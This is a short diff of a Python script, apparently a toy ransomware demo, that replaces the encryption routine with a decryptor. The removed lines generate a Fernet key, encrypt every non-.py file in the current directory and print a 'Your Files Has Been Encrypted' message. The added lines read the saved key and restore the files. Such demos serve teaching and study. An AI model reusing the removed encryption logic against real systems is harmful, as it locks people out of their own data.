@@ -7,11 +7,10 @@ files = os.listdir()
 targets = []
 
 
-# Generate encryption key and save it to text file
-key = Fernet.generate_key()
-key_file = open('key.key', 'wb')
-key_file.write(key)
-key_file.close()
+# Get encryption key
+key = 'key.key'
+with (open(key, 'rb')) as the_key:
+    encryption_key = the_key.read()
 
 
 # Get all files from the current directory
@@ -23,7 +22,7 @@ for file in files:
     if file.lower().endswith(('.py', '.key')):
         continue
 
-    # Execlude directories from encryption
+    # Execlude directories from decryption
     if os.path.isdir(os.path.abspath(file)):
         continue
     
@@ -32,13 +31,11 @@ for file in files:
     with open(file, 'rb') as the_file:
         file_content = the_file.read()
 
-    encrypted_content = Fernet(key).encrypt(file_content)
-
+    decrypted_content = Fernet(encryption_key).decrypt(file_content)
     with open(file, 'wb') as the_file:
-        the_file.write(encrypted_content)
+        the_file.write(decrypted_content)
 
-print('SORRY :( ...... Your Files Has Been Encrypted!')
-
+print('Congratulations ... Your Files Has Been Decrypted Successfully')
 
 
 
